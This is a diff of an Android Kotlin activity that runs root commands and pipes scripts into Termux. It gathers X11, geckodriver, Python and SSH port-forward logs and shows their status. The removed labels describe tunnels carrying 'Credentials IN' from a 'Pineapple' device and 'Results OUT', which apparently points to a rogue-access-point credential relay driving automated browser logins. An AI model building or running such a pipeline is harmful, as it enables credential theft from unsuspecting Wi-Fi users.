-                            val pipeline = "cat $SD_SCRIPT | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
+                            val pipeline =
+                                "cat $SD_SCRIPT | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                             val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))
 
-                            val stdout = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
-                            val stderr = BufferedReader(InputStreamReader(proc.errorStream)).use { it.readText() }
+                            val stdout =
+                                BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
+                            val stderr =
+                                BufferedReader(InputStreamReader(proc.errorStream)).use { it.readText() }
                             val exit = proc.waitFor()
 
-                            Thread.sleep(5000)
+                            // Read logs from Termux after execution
+                            Thread.sleep(1500)
 
                             val readLogsScript = mutableListOf<String>()
                             readLogsScript.add("#!/data/data/com.termux/files/usr/bin/bash")
@@ -677,9 +706,9 @@ class MainActivity : AppCompatActivity() {
                             readLogsScript.add("")
                             readLogsScript.add("export HOME=/data/data/com.termux/files/home")
                             readLogsScript.add("export PREFIX=/data/data/com.termux/files/usr")
-                            readLogsScript.add("export PATH=\"\$PREFIX/bin:\$PATH\"")
+                            readLogsScript.add("export PATH=\"${'$'}PREFIX/bin:${'$'}PATH\"")
                             readLogsScript.add("")
-                            readLogsScript.add("cd \"\$HOME\"")
+                            readLogsScript.add("cd \"${'$'}HOME\"")
                             readLogsScript.add("")
                             readLogsScript.add("echo '=== X11_OUTPUT_LOG ==='")
                             readLogsScript.add("cat x11_output.log 2>/dev/null || echo 'File not found'")
@@ -691,83 +720,142 @@ class MainActivity : AppCompatActivity() {
                             readLogsScript.add("cat env_check.log 2>/dev/null || echo 'File not found'")
                             readLogsScript.add("echo ''")
                             readLogsScript.add("echo '=== GECKODRIVER_LOG ==='")
-                            readLogsScript.add("tail -20 geckodriver.log 2>/dev/null || echo 'File not found'")
+                            readLogsScript.add("tail -200 geckodriver.log 2>/dev/null || echo 'File not found'")
                             readLogsScript.add("echo ''")
                             readLogsScript.add("echo '=== PYTHON_OUTPUT_LOG ==='")
-                            readLogsScript.add("tail -20 python_output.log 2>/dev/null || echo 'File not found'")
+                            readLogsScript.add("tail -200 python_output.log 2>/dev/null || echo 'File not found'")
                             readLogsScript.add("echo ''")
                             readLogsScript.add("echo '=== SSH_SETUP_LOG ==='")
                             readLogsScript.add("cat ssh_setup.log 2>/dev/null || echo 'File not found'")
                             readLogsScript.add("echo ''")
                             readLogsScript.add("echo '=== SSH_FORWARD1_LOG ==='")
-                            readLogsScript.add("cat ssh_forward1.log 2>/dev/null || echo 'File not found'")
+                            readLogsScript.add("tail -200 ssh_forward1.log 2>/dev/null || echo 'File not found'")
                             readLogsScript.add("echo ''")
                             readLogsScript.add("echo '=== SSH_FORWARD2_LOG ==='")
-                            readLogsScript.add("cat ssh_forward2.log 2>/dev/null || echo 'File not found'")
+                            readLogsScript.add("tail -200 ssh_forward2.log 2>/dev/null || echo 'File not found'")
 
                             val readLogsScriptContent = readLogsScript.joinToString("\n")
                             val readLogsScriptPath = "/sdcard/read_logs.sh"
                             writeFileAsRoot(readLogsScriptPath, readLogsScriptContent)
                             execAsRoot("chmod 644 $readLogsScriptPath")
 
-                            val readPipeline = "cat $readLogsScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
-                            val readProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", readPipeline))
-                            val allLogs = BufferedReader(InputStreamReader(readProc.inputStream)).use { it.readText() }
+                            val readPipeline =
+                                "cat $readLogsScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
+                            val readProc =
+                                Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", readPipeline))
+                            val allLogs =
+                                BufferedReader(InputStreamReader(readProc.inputStream)).use { it.readText() }
                             readProc.waitFor()
 
-                            val x11LogContent = allLogs.substringAfter("=== X11_OUTPUT_LOG ===")
-                                .substringBefore("=== CLEANUP_LOG ===").trim()
-                            val cleanupLogContent = allLogs.substringAfter("=== CLEANUP_LOG ===")
-                                .substringBefore("=== ENV_CHECK_LOG ===").trim()
-                            val envCheckLogContent = allLogs.substringAfter("=== ENV_CHECK_LOG ===")
-                                .substringBefore("=== GECKODRIVER_LOG ===").trim()
-                            val geckodriverLogContent = allLogs.substringAfter("=== GECKODRIVER_LOG ===")
-                                .substringBefore("=== PYTHON_OUTPUT_LOG ===").trim()
-                            val pythonLogContent = allLogs.substringAfter("=== PYTHON_OUTPUT_LOG ===")
-                                .substringBefore("=== SSH_SETUP_LOG ===").trim()
-                            val sshSetupLogContent = allLogs.substringAfter("=== SSH_SETUP_LOG ===")
-                                .substringBefore("=== SSH_FORWARD1_LOG ===").trim()
-                            val sshForward1LogContent = allLogs.substringAfter("=== SSH_FORWARD1_LOG ===")
-                                .substringBefore("=== SSH_FORWARD2_LOG ===").trim()
-                            val sshForward2LogContent = allLogs.substringAfter("=== SSH_FORWARD2_LOG ===").trim()
+                            fun section(after: String, before: String? = null): String {
+                                val a = allLogs.substringAfter(after, "")
+                                return if (before == null) a.trim()
+                                else a.substringBefore(before, "").trim()
+                            }
 
+                            val x11LogContent =
+                                section("=== X11_OUTPUT_LOG ===", "=== CLEANUP_LOG ===")
+                            val cleanupLogContent =
+                                section("=== CLEANUP_LOG ===", "=== ENV_CHECK_LOG ===")
+                            val envCheckLogContent =
+                                section("=== ENV_CHECK_LOG ===", "=== GECKODRIVER_LOG ===")
+                            val geckodriverLogContent =
+                                section("=== GECKODRIVER_LOG ===", "=== PYTHON_OUTPUT_LOG ===")
+                            val pythonLogContent =
+                                section("=== PYTHON_OUTPUT_LOG ===", "=== SSH_SETUP_LOG ===")
+                            val sshSetupLogContent =
+                                section("=== SSH_SETUP_LOG ===", "=== SSH_FORWARD1_LOG ===")
+                            val sshForward1LogContent =
+                                section("=== SSH_FORWARD1_LOG ===", "=== SSH_FORWARD2_LOG ===")
+                            val sshForward2LogContent =
+                                section("=== SSH_FORWARD2_LOG ===")
+
+                            val sshOk = sshSetupLogContent.contains("SSH_SETUP_SUCCESS")
+                            val x11Ok = x11LogContent.contains("listening on TCP port 6000") ||
+                                    x11LogContent.contains("✓ X11 listening")
+                            val geckoOk = geckodriverLogContent.contains("Listening on 127.0.0.1:4444") ||
+                                    x11LogContent.contains("Geckodriver PID:")
+
+                            val overallSuccess = (exit == 0) && sshOk && x11Ok && geckoOk
+
+                            // Show output in the app FIRST
                             runOnUiThread {
                                 textView.text = buildString {
-                                    appendLine("✅ Complete Setup Finished")
-                                    appendLine("Script piped to Termux bash (uid $termuxUid).")
+                                    if (overallSuccess) {
+                                        appendLine("✅ Complete Setup Finished (Button 4)")
+                                    } else {
+                                        appendLine("⚠️ Setup finished with issues (Button 4)")
+                                    }
                                     appendLine("Domain: $domain")
                                     appendLine("Exit: $exit")
-                                    if (stdout.isNotBlank()) appendLine("\n--- STDOUT ---\n$stdout")
-                                    if (stderr.isNotBlank()) appendLine("\n--- STDERR ---\n$stderr")
-                                    appendLine("\nUsing TCP connection: DISPLAY=localhost:0")
-                                    appendLine("\n=== X11 & Service Logs ===")
-                                    appendLine(x11LogContent)
+                                    appendLine("")
+                                    if (!sshOk) appendLine("• SSH tunnels: ❌ not established")
+                                    else appendLine("• SSH tunnels: ✅ established")
+                                    if (!x11Ok) appendLine("• X11: ❌ not confirmed listening on TCP :6000")
+                                    else appendLine("• X11: ✅ listening on TCP :6000")
+                                    if (!geckoOk) appendLine("• Geckodriver: ❌ not confirmed")
+                                    else appendLine("• Geckodriver: ✅ running")
+                                    appendLine("")
+                                    if (stdout.isNotBlank()) appendLine("--- STDOUT ---\n$stdout\n")
+                                    if (stderr.isNotBlank()) appendLine("--- STDERR ---\n$stderr\n")
+                                    appendLine("=== X11 & Service Logs ===")
+                                    appendLine(x11LogContent.ifBlank { "(no x11_output.log)" })
                                     appendLine("\n=== Cleanup Log ===")
-                                    appendLine(cleanupLogContent)
+                                    appendLine(cleanupLogContent.ifBlank { "(no cleanup.log)" })
                                     appendLine("\n=== Environment Check ===")
-                                    appendLine(envCheckLogContent)
-                                    appendLine("\n=== Geckodriver Log (last 20 lines) ===")
-                                    appendLine(geckodriverLogContent)
-                                    appendLine("\n=== Python Output (last 20 lines) ===")
-                                    appendLine(pythonLogContent)
-                                    appendLine("\n=== SSH Port Forward Setup ===")
-                                    appendLine("Forward 1: Pineapple:9999 → Android:8080 (Credentials IN)")
-                                    appendLine("Forward 2: Android:9998 → Pineapple:80 (Results OUT)")
-                                    appendLine("\n=== ssh_setup.log ===")
-                                    appendLine(sshSetupLogContent)
-                                    appendLine("\n=== ssh_forward1.log ===")
-                                    appendLine(sshForward1LogContent)
-                                    appendLine("\n=== ssh_forward2.log ===")
-                                    appendLine(sshForward2LogContent)
-                                    appendLine("\nAll logs available in $TERMUX_HOME")
-                                    appendLine("Setup complete - all services and SSH tunnels running!")
+                                    appendLine(envCheckLogContent.ifBlank { "(no env_check.log)" })
+                                    appendLine("\n=== Geckodriver Log (last 200 lines) ===")
+                                    appendLine(geckodriverLogContent.ifBlank { "(no geckodriver.log)" })
+                                    appendLine("\n=== Python Output (last 200 lines) ===")
+                                    appendLine(pythonLogContent.ifBlank { "(no python_output.log)" })
+                                    appendLine("\n=== SSH Port Forward Setup (ssh_setup.log) ===")
+                                    appendLine(sshSetupLogContent.ifBlank { "(no ssh_setup.log)" })
+                                    appendLine("\n=== ssh_forward1.log (last 200 lines) ===")
+                                    appendLine(sshForward1LogContent.ifBlank { "(no ssh_forward1.log)" })
+                                    appendLine("\n=== ssh_forward2.log (last 200 lines) ===")
+                                    appendLine(sshForward2LogContent.ifBlank { "(no ssh_forward2.log)" })
+                                    appendLine("\nLogs are in $TERMUX_HOME")
+                                    when {
+                                        overallSuccess -> appendLine("\n✅ All services and SSH tunnels are up. Preparing to switch to Termux:X11…")
+                                        exit == 2 -> appendLine("\n❌ SSH tunnels failed. Stay in app to review logs.")
+                                        else -> appendLine("\n⚠️ Not all checks passed. Stay in app to review logs.")
+                                    }
                                 }.trim()
                             }
+
+                            // Only after showing output, switch to X11 if successful
+                            if (overallSuccess) {
+                                try {
+                                    Handler(Looper.getMainLooper()).postDelayed({
+                                        try {
+                                            val x11Launch = packageManager.getLaunchIntentForPackage("com.termux.x11")
+                                                ?: Intent().apply {
+                                                    setClassName("com.termux.x11", "com.termux.x11.MainActivity")
+                                                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                                                }
+                                            startActivity(x11Launch)
+                                        } catch (e: ActivityNotFoundException) {
+                                            runOnUiThread {
+                                                textView.append("\n\n⚠️ Termux:X11 not installed; cannot switch automatically.")
+                                            }
+                                        } catch (e: Exception) {
+                                            runOnUiThread {
+                                                textView.append("\n\n⚠️ Failed to launch Termux:X11: ${e.message}")
+                                            }
+                                        }
+                                    }, 900L)
+                                } catch (e: Exception) {
+                                    runOnUiThread {
+                                        textView.append("\n\n⚠️ Delayed launch error: ${e.message}")
+                                    }
+                                }
+                            }
+
                         } catch (e: Exception) {
                             runOnUiThread { textView.text = "Error: ${e.message}" }
                         }
                     }.start()
-            
+
                     dialog.dismiss()
                 }
                 .setNegativeButton("Cancel") { dialog, _ ->
@@ -788,22 +876,22 @@ class MainActivity : AppCompatActivity() {
                 val listProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "grep com.termux /data/system/packages.list"))
                 val listOutput = BufferedReader(InputStreamReader(listProc.inputStream)).use { it.readText() }
                 val listExit = listProc.waitFor()
-                
+
                 if (listExit != 0 || listOutput.isBlank()) {
                     return@Thread
                 }
-                
+
                 // Format: com.termux 10321 0 /data/user/0/com.termux ...
                 val parts = listOutput.trim().split("\\s+".toRegex())
                 if (parts.size < 2) {
                     return@Thread
                 }
-                
+
                 val termuxAppId = parts[1].toIntOrNull() ?: return@Thread
-                
+
                 termuxUid = termuxAppId.toString()
                 termuxGid = termuxAppId.toString()
-                
+
                 // Calculate standard Android supplementary groups
                 // 3003 = inet (network access)
                 // 9997 = everybody
@@ -816,7 +904,7 @@ class MainActivity : AppCompatActivity() {
                     (20000 + appId).toString(),  // cache group (e.g., 20321)
                     (50000 + appId).toString()   // all group (e.g., 50321)
                 )
-                
+
                 termuxGroups = supplementaryGroups.joinToString(" ") { "-G $it" }
             } catch (e: Exception) {
                 // Silent failure - will be caught later when trying to use these values
@@ -832,36 +920,36 @@ class MainActivity : AppCompatActivity() {
         if (termuxUid.isNotEmpty() && termuxGid.isNotEmpty() && termuxGroups.isNotEmpty()) {
             return Pair(true, null)
         }
-        
+
         try {
             // Get Termux UID from packages.list
             val listProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "grep com.termux /data/system/packages.list"))
             val listOutput = BufferedReader(InputStreamReader(listProc.inputStream)).use { it.readText() }
             val listError = BufferedReader(InputStreamReader(listProc.errorStream)).use { it.readText() }
             val listExit = listProc.waitFor()
-            
+
             if (listExit != 0) {
                 return Pair(false, "Failed to read packages.list (exit: $listExit)\nError: $listError")
             }
-            
+
             if (listOutput.isBlank()) {
                 return Pair(false, "Termux not found in packages.list. Is Termux installed?")
             }
-            
+
             // Format: com.termux 10321 0 /data/user/0/com.termux ...
             val parts = listOutput.trim().split("\\s+".toRegex())
             if (parts.size < 2) {
                 return Pair(false, "Invalid format in packages.list:\n$listOutput")
             }
-            
+
             val termuxAppId = parts[1].toIntOrNull()
             if (termuxAppId == null) {
                 return Pair(false, "Could not parse UID from packages.list:\n$listOutput")
             }
-            
+
             termuxUid = termuxAppId.toString()
             termuxGid = termuxAppId.toString()
-            
+
             // Calculate standard Android supplementary groups
             // 3003 = inet (network access)
             // 9997 = everybody
@@ -874,11 +962,11 @@ class MainActivity : AppCompatActivity() {
                 (20000 + appId).toString(),  // cache group (e.g., 20321)
                 (50000 + appId).toString()   // all group (e.g., 50321)
             )
-            
+
             termuxGroups = supplementaryGroups.joinToString(" ") { "-G $it" }
-            
+
             return Pair(true, null)
-            
+
         } catch (e: Exception) {
             return Pair(false, "Exception during detection: ${e.message}\n${e.stackTraceToString()}")
         }
@@ -910,8 +998,10 @@ class MainActivity : AppCompatActivity() {
         Thread {
             try {
                 val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
-                val output = BufferedReader(InputStreamReader(process.inputStream)).use { it.readText() }
-                val errorOutput = BufferedReader(InputStreamReader(process.errorStream)).use { it.readText() }
+                val output =
+                    BufferedReader(InputStreamReader(process.inputStream)).use { it.readText() }
+                val errorOutput =
+                    BufferedReader(InputStreamReader(process.errorStream)).use { it.readText() }
                 val code = process.waitFor()
                 runOnUiThread {
                     textView.text = when {
